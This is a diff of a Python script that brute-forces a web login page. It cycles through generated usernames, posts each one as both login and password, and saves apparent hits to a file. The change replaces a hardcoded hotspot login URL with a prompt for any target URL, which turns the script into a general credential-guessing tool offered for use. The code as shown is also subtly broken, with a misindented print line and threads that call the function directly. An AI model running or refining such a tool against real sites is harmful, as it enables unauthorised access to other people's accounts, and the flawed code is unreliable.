@@ -2,6 +2,7 @@ import requests
 import time
 import threading
 
+site=input("enter the target url : ")
 
 def crack(rec):
     letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
@@ -55,18 +56,18 @@ def crack(rec):
                         break
         while bou:
             try:
-                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
+                r = requests.post(site, data=payload)
                 bou=0
             except :
-                print("connexion non etablie, reconnexion...")
+                print("lost connection, reconnection ...")
         
         if "invalid password" in r.text:
-            print("login et password trouver : {},{}".format(user,user))
+          print("login and password found  : {},{}".format(user,user))
             fd=open("login_found.txt",'a')
             fd.write(user+":"+user)
             fd.close()
         else :
-            print("login {} incorrect".format(user))
+            print("login {} invalid".format(user))
 
 t1=threading.Thread(target=crack(1))
 t2=threading.Thread(target=crack(2))
